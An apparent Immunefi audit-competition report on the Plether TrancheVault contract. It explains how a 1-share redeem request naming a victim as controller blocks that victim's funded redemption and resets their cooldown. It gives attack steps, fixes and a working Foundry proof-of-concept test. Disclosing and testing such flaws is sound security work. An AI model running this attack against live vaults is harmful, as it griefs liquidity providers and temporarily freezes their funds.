# \#99172 [SC-Low] TrancheVault: anyone can poison another controller's redeem-queue head with a 1-share request, hiding and blocking their funded redemption on the ERC-7540 claim surface

**Submitted on Nov 12th 2026 at 09:41:53 UTC by @r49 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99172
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro
`TrancheVault.requestRedeem(shares, controller, owner)` authorises only the share `owner`; the `controller` is arbitrary. An attacker can therefore place a 1-share redeem request at the head of a victim's per-controller redeem queue. The standard ERC-4626/ERC-7540 claim functions (`redeem`, `withdraw`, `maxRedeem`, `maxWithdraw`) operate only on `controllerRedeemHead[controller]`. Once the attacker's epoch settles with zero payout it becomes a refund epoch, and the head stays stuck until the victim calls the non-standard `claimRedeemRefund`, which also restarts the victim's 1-hour deposit cooldown. Until then the victim's own, fully funded redemption reports `maxRedeem == maxWithdraw == 0` and `redeem`/`withdraw` revert.

## Vulnerability Details
Root cause, all in `packages/perps/src/TrancheVault.sol` at a82d4fef:

- `requestRedeem` (L606-632): only `owner` is authorised (`msg.sender == owner`, operator or allowance). No consent from `controller`.
- `_requireMinimumRedeemSize` (L1611-1618): the minimum request size is skipped when `shares == maxShares`, so a full-balance request of 1 share is accepted.
- `_enqueueRedeemRequest` appends the request to `controllerRedeemHead/Tail[controller]`, which is the victim's queue.
- `redeem`/`withdraw` (L998-1012) and `maxRedeem`/`maxWithdraw` (L1299-1311) read only `controllerRedeemHead[controller]`.
- A zero-payout epoch is converted into a refund epoch by HousePool (HousePool.sol L957-986). `_maybeCloseRedeemPosition` (L1216-1227) unlinks a refund-enabled head only when `position.refundClaimed` is set.
- `refundClaimed` is set only in `claimRedeemRefund` (L916-947). That function is controller/operator-gated and executes `lastDepositTime[receiver] = block.timestamp`.

Attack:
1. Attacker holds 1 tranche share (any acquisition) and calls `requestRedeem(1, victim, attacker)`. The request becomes `controllerRedeemHead[victim]`.
2. Victim later requests a real redemption, which queues behind the poison request.
3. Both epochs settle: the poison epoch pays 0 and becomes a refund epoch; the victim's epoch is funded.
4. The victim's funded claim is now invisible and unclaimable through the standard interface until the victim discovers and calls `claimRedeemRefund`, which re-arms their cooldown.

## Impact Details
- After settlement, the victim's funded redemption is invisible to the standard interface: `maxRedeem(victim) == 0`, `maxWithdraw(victim) == 0`, and `pendingRedeemRequest(head, victim) == 0`. `redeem` and `withdraw` revert with `ERC4626ExceededMaxRedeem/Withdraw(victim, x, 0)`.
- The only way out through the head is the custom `claimRedeemRefund`, which re-arms the victim's 1-hour wallet cooldown and blocks new redeem requests and share transfers out for that hour. The attacker can repeat this every epoch at a cost of 1 share plus gas.
- Any contract LP (vault-of-vaults, aggregator, multisig module) that integrates only the ERC-7540/ERC-4626 standard functions and has no path to `claimRedeemRefund` or the by-id `claimRedeem` has its USDG redemption frozen.
- EOAs can escape by calling `claimRedeem(requestId, ...)` by id, which limits the impact for them to griefing plus the forced cooldown.

Impacts: Griefing (no profit motive, damage to users); Temporary freezing of funds for at least 1 hour.

## Recommendation
- Require `msg.sender == controller` or `isOperator[controller][msg.sender]` when `controller != owner` in `requestRedeem` (and likewise in `requestDeposit`), or
- make the head-based claim functions skip heads with nothing claimable, and do not reset `lastDepositTime` on zero-value refunds.

## Not a known issue
- MED-24 (zero-payout refund epochs) concerns settlement work and bounded processing, not per-controller claim-head blocking.
- LOW-39/40 fixed receiver dust (`receiver == controller`) but do not stop requests that name a foreign controller.
- SECURITY.md:1409-1410 notes that a full-balance redemption bypasses the minimum request size and can burn shares for zero assets. That covers the requester's own dust loss; it does not cover naming a foreign controller, hijacking that controller's redeem head, or the resulting `maxRedeem`/`maxWithdraw` = 0 and forced cooldown reset for the victim.
- No coverage in the AI scan or pre-audit. `TrancheShareReceiver.t.sol` covers unsolicited share dust only.

## References
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- ERC-7540 controller semantics: https://eips.ethereum.org/EIPS/eip-7540

## Proof of Concept

## Proof of Concept
Runs in the repository's Foundry suite at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 without modifying any in-scope contract. Save as `packages/perps/test/perps/spec/lp/PocRedeemHeadPoison.t.sol` and run:

```
cd packages/perps
forge test --match-test test_Poc_ThirdPartyDustRequestPoisonsVictimRedeemHead -vvv
```

Result: `[PASS] test_Poc_ThirdPartyDustRequestPoisonsVictimRedeemHead()`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {AsyncLpEpochSettlementTest} from "./AsyncLpEpochSettlement.t.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

contract PocRedeemHeadPoisonTest is AsyncLpEpochSettlementTest {

    address internal constant ATTACKER = address(0xBAD);

    function test_Poc_ThirdPartyDustRequestPoisonsVictimRedeemHead() public {
        uint256 victimShares = _fundOne(juniorVault, ALICE, 10_000e6);

        // Attacker obtains 1 share (stands in for any acquisition).
        vm.prank(ALICE);
        juniorVault.transfer(ATTACKER, 1);
        victimShares -= 1;

        // 1. Attacker files a 1-share full-balance redeem request with controller = victim.
        uint256 poisonId = _requestRedeem(juniorVault, ATTACKER, 1, ALICE, ATTACKER);
        assertEq(juniorVault.controllerRedeemHead(ALICE), poisonId, "attacker request becomes victim's head");

        // 2. Victim files a real redemption, queued behind the poison request.
        _warpToEpoch(poisonId);
        _refreshMark();
        uint256 realId = _requestRedeem(juniorVault, ALICE, victimShares / 2, ALICE, ALICE);
        assertGt(realId, poisonId);

        // 3. Settle: poison epoch has zero payout -> refund epoch; victim epoch is funded.
        _settleAt(poisonId);
        _settleAt(realId);

        uint256 claimableAssets = _async(juniorVault).claimableRedeemAssets(realId, ALICE);
        assertGt(claimableAssets, 4000e6, "victim redemption is funded");

        // 4. Standard ERC-7540/4626 surface is blocked for the victim.
        assertEq(juniorVault.controllerRedeemHead(ALICE), poisonId);
        assertEq(juniorVault.maxRedeem(ALICE), 0);
        assertEq(juniorVault.maxWithdraw(ALICE), 0);
        assertEq(_pendingRedeem(juniorVault, poisonId, ALICE), 0);

        vm.startPrank(ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, ALICE, 1, 0));
        juniorVault.redeem(1, ALICE, ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, ALICE, 1, 0));
        juniorVault.withdraw(1, ALICE, ALICE);

        // 5. Only escape is the custom refund call, which re-arms the victim's wallet cooldown.
        uint256 t = block.timestamp;
        juniorVault.claimRedeemRefund(poisonId, ALICE, ALICE);
        vm.stopPrank();
        assertEq(juniorVault.lastDepositTime(ALICE), t, "victim cooldown restarted by attacker dust");
        assertEq(juniorVault.controllerRedeemHead(ALICE), realId);
        assertEq(juniorVault.maxWithdraw(ALICE), claimableAssets);
    }
}
```

The test asserts: (1) the attacker's request becomes the victim's head; (2) the victim's own later request is funded (>4,000 USDG claimable); (3) `maxRedeem == maxWithdraw == 0` and `redeem`/`withdraw` revert for the victim; (4) the only head-advancing escape, `claimRedeemRefund`, resets the victim's `lastDepositTime`; (5) only after that does the head advance and `maxWithdraw` show the funded amount.
